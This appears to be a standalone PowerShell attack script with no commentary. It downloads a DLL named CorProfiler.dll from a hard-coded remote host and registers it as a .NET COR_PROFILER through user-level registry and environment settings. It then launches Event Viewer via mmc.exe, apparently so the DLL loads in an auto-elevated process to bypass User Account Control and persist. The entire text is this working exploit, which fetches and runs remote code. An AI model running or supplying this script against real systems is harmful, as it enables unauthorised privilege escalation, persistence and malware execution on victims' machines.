$RHOST = "172.16.44.128"
$clsid_guid = "6ea2eaa8-5901-4b8f-aff1-6b83e56ddf64"
$file_name = "CorProfiler.dll"
$file_path = "$HOME\AppData\Roaming\Microsoft\Windows\Libraries\$file_name"

$download_url = "http://$RHOST/$file_name"
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile($download_url, $file_path)

New-Item -Path "HKCU:\Software\Classes\CLSID\{$clsid_guid}\InprocServer32" -Value "$file_path" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "{$clsid_guid}" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value "$file_path" -Force | Out-Null

Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
START MMC.EXE EVENTVWR.MSC
